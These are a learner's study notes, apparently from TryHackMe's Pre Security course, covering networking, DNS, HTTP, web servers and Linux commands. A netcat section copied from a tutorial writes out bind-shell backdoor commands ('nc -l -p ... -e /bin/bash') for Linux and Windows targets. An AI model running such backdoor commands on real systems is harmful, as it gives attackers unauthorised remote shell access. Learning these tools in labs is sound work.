## Introduction to Cyber Security
#### Gobuster

"[Gobuster](https://github.com/OJ/gobuster)" Gobuster will take a list of potential page or directory names and try accessing a website with each of them; if the page exists, it tells you.

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260206160704.png)


---

#### SOC

**Security Operations Center (SOC)** is a team of IT security professionals tasked with monitoring, preventing , detecting , investigating, and responding to threats within a company’s network and systems.


> *If a patch is not available, organizations must implement alternative measures to safeguard the system and mitigate potential exploitation.*


***swag voucher: - <!-- KUWCTJ-79O2GR-GPYP8H-H5AL4G -->***


---

#### Threat Intelligence

In this context, _intelligence_ refers to information you gather about actual and potential enemies.


---

#### Digital Forensics

Forensics is the application of science to investigate crimes and establish facts.
It focuses on:
- File System (taking images)
- System memory (taking images)
- network logs
- system logs (very important)


---

#### Incident Response

Incident response specifies the methodology that should be followed to handle a cyber security incident case.
Phases include:
- Preparation
- Detection and Analysis
- Containment, Eradication and Recovery
- Post Incident activity


---

#### Malware Analysis:

Analysis of malicious software. Includes virus, trojan horse and ransomware. Analysis techniques mainly includes static and dynamic analysis.

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260206161040.png)


---

#### Careers in Cyber Security

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260206182127.png)


---

## Network Fundamentals

#### What is Networking:

- Network
	- Public Network
	- Private Network
- IP Address
	- IPv4
	- IPv6
- MAC Address
- MAC Spoofing
- Ping

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260206155940.png)


---

#### Intro to LAN:

- LAN
- Topologies
	- Star topology
	- Bus topology
	- Ring topology
- Switch
- Router

- Subnetting (dividing a network into multiple parts)
	- Used for security and management.

- ARP
	- Map IP address to MAC Address on each port in a network.
	- Types of Signals by ARP:
		- ARP Request
		- ARP Reply.

When an **ARP request** is sent, a message is broadcasted on the network to other devices asking, "What is the mac address that owns this IP address?" When the other devices receive that message, they will only respond if they own that IP address and will send an **ARP reply** with its MAC address. The requesting device can now remember this mapping and store it in its **ARP cache** for future use.

- DHCP:
	- IP addresses can be assigned **manually** or **automatically using DHCP**. With DHCP, a device requests an IP when it joins a network, the DHCP server offers one, the device accepts it, and the server confirms—allowing the device to start using the IP address.
	- Requests:
		- DHCP discover
		- DHCP offer
		- DHCP request
		- DHCP ACK


Room completed:

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260206210225.png)


---

#### OSI Model
- All devices follow same unique framework.
- Seven layers arranged from 7 to 1 (bottom to top).
- Encapsulation in the OSI model refers to the process of wrapping data with protocol information at each layer of the model. As data is passed down from the application layer to the physical layer, each layer adds its own header (and sometimes trailer) to the data. This process ensures that the data is properly handled and understood by the receiving device, as each layer only interacts with its adjacent layers. This is crucial for effective communication over a network.


##### Physical Layer:
- Lowest layer in OSI
- Devices use binary to send and receive data on hardware.

##### Data Link Layer:
- focuses on physical addressing like MAC address that each NIC in hardware have.
- adds MAC of receiving device after receiving packet from network layer with IP header added.
- Converts the data that is suitable for transmission.

##### Network Layer:
- Third layer of OSI.
- Main Goals: Routing and Reassembly.
- Routing Protocols used:
	- OSPF
	- RIP
- Shortest path is decided by following factors:
	- Shortest path.
	- Reliable path.
	- Fastest Path.
- Layer 3 devices e.g Routers

##### Transport Layer:
- 4th Layer
- Protocols used:
	- TCP:
		- Connection oriented, provides reliable data transfer, flow control and congestion control.
	- UDP:
		- Connectionless protocol, suitable for protocols require fast queries like DNS.
		- No gaurantee no synchronization, just hope for the best.


##### Session Layer:
- 5th Layer
- Creates, maintains and terminates sessions with other devices.
- Uses checkpoints to retransmit lost data.
- Technical term for established connection = "session"


##### Presentation Layer:
- Layer 6
- Used for standardisation.
- converts data in one format to and from Application layer.
- Example: two developers developing two different email clients.
- Performs functions such as HTTPS for secure website preview.
- Acts as a "translator" to application layer.


##### Application Layer:
- Last layer in OSI
- Protocols used determines how user will interact with data sent or received.
- Exmples:
	- HTTP/HTTPS
	- DNS
	- FTP - etc


#### OSI Dungeon Escaped:

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260207164000.png)
hehe, I just beat their team record of 19 seconds!


---

#### Completed:

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260207164057.png)


---

#### Packets and Frames:

##### What are packets and frames:

Packets are formed on network layer and frames are formed on data link layer after encapsulation. 
Some notable headers in an IP packets are as follows:
- **TTL (Time To Live):** A packet that can live in a network if it is not reached to the intended destination. TTL 64 ms is for Linux and 128 ms is for Windows. Routers typically use 255 ms TTL. To find the hops manually subtract the TTL from the received TTL. For example I did ping to Google's DNS and received 119 ms as TTL. It means It was running a windows server and 128 - 119 = 9. There are 9 hops in between.

- **Checksum:** It is an error detection mechanism in TCP packets. It adds all the headers, payload and Pseudo header and takes one's complement and then send it along the packet to the other device and then it is recalculated there and compared with the sent checksum. If all the bits of both checksum are 1s. Otherwise there will be errors.

- **Source IP address:** The IP address of the device from which the data is being sent from.

- **Destination IP address:** The IP address of the device to which next device the data is being sent.


---

#### TCP/IP - Three way handshake:

- Transmission Control Protocol
- Connection oriented protocol
- Also can be called summarized version of OSI (arguably).

- **These layers include:**
	- Application layer
	- Network layer
	- Transport layer
	- Physical layer
- It also performs encapsulation, antonym is decapsulation.
- **Following headers are found in a TCP packet:**
	- **Src Port:** Port from which TCP packet is send chosen randomly that is currently not in use.
	- **Dst Port:** The port value at which the data is sent. On which a service is running like HTTP on port 80.
	- **Source IP:** The IP address of the device from which the data is sent.
	- **Dest. IP:** The IP address of the device to which the data is sent.
	- **Sequence Number:** In each session when first packet is sent it is assigned a random number.
	- **Acknowledgement Number:** After the first packet the later packets are assigned numbers +1.
	- **[[#What are packets and frames | Checksum]]:** Discussed above.
	- **Data:** The actual data for example the file.
	- **Flag:** This header determines how the packet should be handled by either device during the handshake process.

##### Three way handshake messages for TCP:

- **SYN:** This packet is sent by client to initiate the connection and requests for synchronization. Sends ISN to SYNchronise.
- **SYN/ACK:** This packet is sent by the second device to first one to confirm the initiation of synchronization. Also sends the ISN to first device and ACK their ISN. Both devices must be agreed upon a ISN(Initail Sequence Number).
- **ACK:** This packet can be sent by either device to confirm that the series of messages has been successfully received.
- **DATA:** Once a connection is established the data is as BYTES of a file are sent through the DATA message.
- **FIN:** This packet is used to properly close the connection after the data transfer.
- **RST:** This packet abruptly ends all communications and can be due to any error.

##### **TCP Closing a Connection:**
To close the connection the device 1 will send the FIN packet and also the device 2 will also have to ACK this FIN and again send FIN to device 1 and then device 1 will ACK that FIN.


---

#### UDP/IP:

- Stateless protocol
- No SYN
- No three way handshake
- No process takes place to setup a connection
- no data integrity
- simple than TCP and have less headers than TCP
- UDP headers are as follows:
	- **TTL (Time To Live):** This is as the expiry timer of the packet if it doesn't manages to reach the intended host.
	- **Source IP address:** The IP address of the device sending the packet.
	- **Destination IP Address:** The IP Address of the device to which data is being sent.
	- **Source port:** The port number from which the data is being sent. It can be in in range 0 - 65535.
	- **Destination port:** The port number on which the intended application or service is running on the remote host. For example: HTTP on port 80 and SSH on port 22.
	- **Data:** The actual Bytes of the data being sent. e.g the file.
- Repeat: Connectionless and no acknowledgement.


---

#### Ports:
Studied about common ports (0 - 1024) For example:
- 80 for HTTP
- 443 for HTTPS
- 21 for FTP
- 22 for SSH
- 3389 for RDP
- 445 for SMB (Server Message Block - Same as FTP but also allows sharing devices such as printers.)
- $nc
##### Netcat:

**for help:**
```
nc -h 
```

**Connecting to a Server:**

```
nc [Target IP Address] [Target Port]
nc 192.168.17.43 21
```

**More from geekforgeeks:**

**Chatting**  
Netcat can also be used to chat between two users. We need to establish a connection before chatting. To do this we are going to need two devices. One will play the role of initiator and one will be a listener to start the conversation and so once the connection is established, communication can be done from both ends. First of all, we will use Windows 10 machine which will play role of Listener.Second we will use Kali linux machine which will play role of initiator. First, we will have to create a listener. We will use the following command to create a listener: 

```
nc -lvvp 4444 
```

where, 
[-l]: Listen Mode 
[vv]: Verbose Mode {It can be used once, but we use twice to be more verbose} 
[p]: Local Port 

how, it’s time to create an initiator, for this we will just provide the IP Address of the System where we started the Listener followed by the port number. 

**NOTE:** Use the same port to create an initiator that was used in creating listener. 

```
nc 192.168.1.35 4444 
```

**Creating a backdoor**   
We can also create a backdoor using NC. To create a backdoor on the target system that we can come back to at any time. Command for attacking a Linux System.   

```
nc -l -p 2222 -e /bin/bash 
```

For Creating Backdoor for Windows system.   

```
nc -l -p 1337 -e hack.exe 
```

This will open a listener on the system that will pipe the command shell or the Linux bash shell to the connecting system.   

```
nc 192.168.1.35 2222 
```

**Verbose mode**   
In netcat, Verbose is a mode which can be initiated using [-v] parameter. Now verbose mode generates extended information. Basically, we will connect to a server using netcat two times to see the difference between normal and verbose modes.   
**The command is**

```
nc 192.168.17.43 21 -v   
```
  
**Save Output to Desktop**   
For the purpose of the record maintenance, better readability, and future references, we will save the output of the Netcat. To do this we will use the parameter -o of the Netcat to save the output in the text file. 

```
nc 192.168.17.43 21 -v -o /root/Desktop/Result.txt
``` 

**File Transfer**   
Netcat can be used to transfer the file across devices. Here we will create a scenario where we will transfer a file from a Windows system to a Kali Linux system. To send the file from the Windows, we will use the following command.   

```
nc -v -w 20 -p 8888 -l file.txt 
```

So, this was a basic guide to netcat. It’s quite an interesting tool to use as well as it is pretty easy.



---


## **Completed:**

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260208004555.png)

---


#### Extending your Network:

##### Port forwarding:
If a web server is setup on a local network then PCs with in that network will be able to connect to the web server on port 80. This is intranet. If outside network is to be communicated with this web server then we will have to do port forwarding. It is done on router of server. Then the website will accessible using the public IP of the router of server.


---

##### Firewalls:
These are the security devices in cyber security used to filter traffic based on rules that what traffic will enter or leave the network.

**These rules based on:**
- Source IP
- Destination IP
- Destination Port
- Protocol

**Types of Firewalls:**
- **Stateful Firewall:** It inspects packets based on whole connection instead of individual packets and decision making is dynamic hence consumes a lot of resources.
- **Stateless Firewalls:** Static Firewalls, analyze individual packets. Best for large amount of data. They are dumb and if a rule is not match these firewalls are useless.

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260208122708.png) 

Stopping a DOS attack and blocking the attacker's IP on port 80.

---


#### VPN:
- Virtual Private Network
- Allows devices to communicate securely by creating a tunnel. It also allows different networks (offices and businesses) to connect securely.
- If two networks are connected via a tunnel through two devices then instead of whole networks only that 2 devices are able to communicate with each other.
- offers anonymity, privacy and secure distant connections.

##### VPN Technologies:
- PPP
- PPTP
- IPSec


---


#### LAN Networking Devices:

##### Router:
Routes data between network so called router. Already discussed above.

##### Switch:
Connects multiple devices in a network ranging from 3 to 63. Switches are of layer 2 and layer 3.
Layer 3 switches work in terms of VLANs.


**Room Completed:**

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260208213352.png)


---


## How the Web Works:

#### DNS in detail:

**DNS:**
- Domain Name System
- Used for converting domain names to IP addresses.
- Instead of remembering 104.26.10.229, you can remember [tryhackme.com](http://tryhackme.com/) instead.

**Domain Heirarchy:**
- Root Domain
- Top Level Domain
	- gTLD (Generic Top Level Domain like .com .org .ai .store)
	- ccTLD (Country Code Top Level Domain like .pk .ae .se)
- Second Level Domain
- Subdomain

> Max characters in a subdomain = 63
> Max characters in a domain name = 253
> Cannot include _
> Cannot start or end with a hypen
> No consecutive hyphens
> Just a - z and 0 - 9


**Types of DNS Records:**
- A Record
- AAAA Record
- CNAME Record
- MX Record
- TXT Record


---


#### Making a DNS request:
- Local Cache
- Recursive DNS (also check Cache)
- Root server
- TLD server
- Authoritative server
- Goes back to recursive server for cache
- Returned to client made request.

>A TTL is assigned to the DNS cache for future use in seconds.


---


**Room Completed:**

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260208230941.png)


---


#### HTTP in detrail:

##### What is HTTP(S):
- Hyper Text Transfer Protocol (Secure)
- Used to view web pages and interact with web servers
- Helps in transmitting webpage data, images etc

**HTTPS:**
Verifys the web server identity and is secure for communication as encrypted data moves through it.


#### Request and Responses:

- URL (uniform Resource Locator): The path to a resource.
- Parts of a URL:
	- **Scheme:** This instructs on what protocol to use for accessing the resource such as HTTP, HTTPS, FTP (File Transfer Protocol).
	- **User:** Some services require authentication to log in, you can put a username and password into the URL to log in.
	- **Host:** The domain name or IP address of the server you wish to access.
	- **Port:** The Port that you are going to connect to, usually 80 for HTTP and 443 for HTTPS, but this can be hosted on any port between 1 - 65535.
	- **Path:** The file name or location of the resource you are trying to access.
	- **Query String:** Extra bits of information that can be sent to the requested path. For example, /blog?**id=1** would tell the blog path that you wish to receive the blog article with the id of 1.
	- **Fragment:** This is a reference to a location on the actual page requested. This is commonly used for pages with long content and can have a certain part of the page directly linked to it, so it is viewable to the user as soon as they access the page.
- Request
- Response
- headers


---


#### HTTP methods:
- GET
- POST
- PUT
- DELETE


---

#### Headers:
- Request and Response Headers
- **Cookies:**
	- When we request a resource from a web server. We also get back the **set-cookie** header and then browser uses it for storing data which is again forwarded to the webserver on request as HTTP is stateless and we need some type of mechanism to store our past information and help the server in recognizing us.
	- They are also used for authentication.
	- Use developer tools to checkout cookies and network tab for request and response.

#### Room Completed:

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260211224152.png)


---


#### How the Web Works:
- Two main components of a website:
	- Front end
	- back end


---


#### HTML:
Websites are basically created using:
- HTML : Hyper Text Markup Language. Used as a basic structure of the website.
- CSS: Used to styling
- JS: Used to make web pages interactive and add functionalities.


> Tip: Always check for source code first when going to test a web application.



---


#### HTML Injection:
We can add our own html and js into the input fields and the server runs it by getting the data as input if no sanitization is done to the code.


#### Room completed:
![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260212114523.png)


---


#### Putting it all together:
Basic structure of a web request:

```
Request in browser ---> DNS resolve ---> connect to server ---> get resouces
```


---


#### Load Balancers:
Main features of a load balancer are:
- Load management
- Providing failover
- Security against DDOS.
- **health check**

Load balancers work on algorithms like **ROUND-ROBIN**.

#### CDN (Content Delivery Networks):
These servers store static files from a web server and provide resources to clients if requested based on the nearest CDN server. It reduces latency and increases speed. aka edge server.


#### Databases:
Used to store information and data, can be complex and collection of databases. Websites can communicate with the databases and manage data. e.g. MSSQL, MYSQL, MongoDB, Postgres.


#### WAF:
Protects webserver from hacks and D/DOS attacks. It also does rate limiting. it is a basically the number of requests to a server from a specific IP.


---


#### Web Server:
it is a web server software that receives requests from clients and uses HTTP to provide resources back to clients. Common web servers are ngnix, apache, IIS and NodeJS. 

Default directory for linux based server:

```
/var/www/html/
```

Default directory for windows based servers:

```
C:\inetpub\wwwroot\
```

#### Virtual hosts:
The concept of hosting multiple websites on a single web server. For this we use **Virtual Hosts**. VH is just a text based config file and matches the domain name in the request and sends the content of that website if no specific domain is found returns the default website.


#### Static vs Dynamic content:
- **Static content:** The type of content that donot change with every request and is delivered as static to the client. like CSS, JS, images and maybe HTML.
- **Dynamic content:** The type of content that changes with every request from the web server. The things you see is the processed form of HTML and other content in the **back end** and is called **front end**.


#### Scripting and backend language:
It make websites interactive to users. like PHP, Python, Ruby ,NodeJS, Perl etc. 

If index.php was built like this:

```
<html><body>Hello <?php echo $_GET["name"]; ?></body></html>
```

It would output the following to the client:

```
<html><body>Hello adam</body></html>
```

#### Room completed:

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260213233523.png)


---


#### Linux fundamentals:

**Linux:** It is a unix based OS.

It is light weight, used in websites, car entertainment systems, PoS and critical infrastructure such as traffic system and industrial sensors.


#### Flavors of linux:
There are several distributions of linux, e.g kali, ubuntu (server and desktop), parrot, fedora, black arch etc...

*Ubuntu can run only on 512 MB of RAM!*

> Linux was firstly released by Linus Torvalds in 1991.


#### Linux commands:

Output on the terminal:

```
echo "something here"
```

current user logged in:

```
whoami
```

listing files and directories:

```
ls
```

changing directory:

```
cd DIRECTORY
```

concatenate/show contents on the terminal:

```
cat filename
```

print working directory:

```
pwd
```

count number of entries such as in log files:

```
wc -l 'file_name'
```

finding a specific file (can also use wildcards)

```
find -name "filename.ext"

find -name "*.ext"
```

Indirectly listing contents for scripting and general purpose:

```
pwd | ls
```

Find a specific word or entry in a file:

```
grep "WORD_TO_BE_FOUND" filename.ext
```

Finding a word or entry in sub folders and all files in a directory in once:

```
grep -R "WORD_TO_BE_FOUND" /directory
```

#### Shell Operators:

& shell operator allowing us to run tasks in the background and do other tasks on the terminal:

```
cp largefile.iso /path/to/destination/ &
```

joining two commands:
This will execute the **command2** only if **command1** is successful.

```
command1 && command2
```

'>' output redirector: (saving hey to file welcome)

```
echo hey > welcome
```

'>>' output redirector but appends (donot replace):

```
echo hello >> welcome
```

not cat the file welcome and we will definitely get:

```
hey
hello
```

#### Commands from Linux Fundamentals 2:

making new files:

```
touch filename
```

making new directory:

```
mkdir 'foldername'
```

copying files from one directory to another:

```
cp filename /destination
```

moving files same as cut in windows:

```
mv filename /destination
```

removing a file or folder (empty folders only):

```
rm file/folder
```

to delete them anyway use flag -f

```
rm folder -f
```

Know the type of file using its contents not by file extension:

```
file filename
```



#### Room completed:

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260214165350.png)


---


#### SSH (Secure Shell):
A protocol in encrypted form used to connect to remote machines.

**How does SSH works:** We send a command through shell it is encrypted using cryptography for travelling across the network and then unencrypted again once it reaches the remote shell.

#### Flags and Switches:
used to extend the behavior of commands.

use help flag to know how to use commands with flags and switches:

```
command --help

# or

man command
```

for human-readable size of files with details we use commands:

```
ls -l -h
```

changing user on the runtime:

```
su username
```

you just need to know the password and username for the user you wish to change.

> Upon changing user with the following command we land in the home directory of the new user

```
su - usernmae
su -l username
su --login username

# all are same.
```



---


#### understanding file permissions in numeric format:

```
rwx rwx rwx
```

- First 3 for Owner
- Next3 for group
- Last 3 for others

- Read = 4
- Write  = 2
- Execute  = 1
- Sum = 7 (depending on the permissions)

the above becomes in numerical as:

```
777
```

these numerics can be used with linux command to change permissions, For example:

```
chmod 750 filename

# or

chmod +x filename # for giving exec permissions
```


---


#### Common directories:

**/etc:**
This is where the important files used by the system are stores such as **passwd, shadow, sudoers, sudoers.d**. 

**/var:** For storing variable data like which is changed regularly for example the logs. They are mostly stored as **/var/logs**.

**/root:** This is the home directory of the systems root user.

**/tmp:** used for storing temporary data in the system. Like memnory when system restarts the memory is wiped out.

> Very Very Important Note: When a user login to a  machine, he is permissible to write in this directory so during pentesting we can save out enumrations and scripts.


#### Room completed:

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260215021238.png)


---


#### Terminal Text Editors:
**Nano:** A simple terminal bases text editor.

usage:

```
nano filename
```

You can use these features of nano by pressing the "**Ctrl**" key (which is represented as an `^` on Linux)  and a corresponding letter. For example, to exit, we would want to press "**Ctrl**" and "**X**" to exit Nano.

**VIM:** A bit of advanced featured text editor as compared to **nano**.

you can install it using:

```
sudo apt install vim
```


---


#### Downloading files:

**wget:** Allows us to download files over the HTTP. If you know the url of resource, you can simple download it in your browser.

```
wget RESOURCE_URL
```

**scp:** Allows us to securely copy files and directories from source to destination.

basic format of command:

```
scp source destination
```


```
# from host to remote:
scp filename USER@IP:/PATH/

# from remote to host:
scp USER@IP:/PATH/ filename 
```


---


#### Python web server:
Ubuntu machines have python preinstalled. Python has a module **http.server** we can use this to share files over the LAN and any computer can download it.

Command:

```
python -m http.server
```

users can get resources using the following commands:

```
wget

# or 

curl
```

use this command to remotely get files on windows (CMD):

```
powershell -Command "Invoke-WebRequest -Uri <URL> -OutFile <filename>"
```

alternatively use [updog](https://github.com/sc0tfree/updog)


---


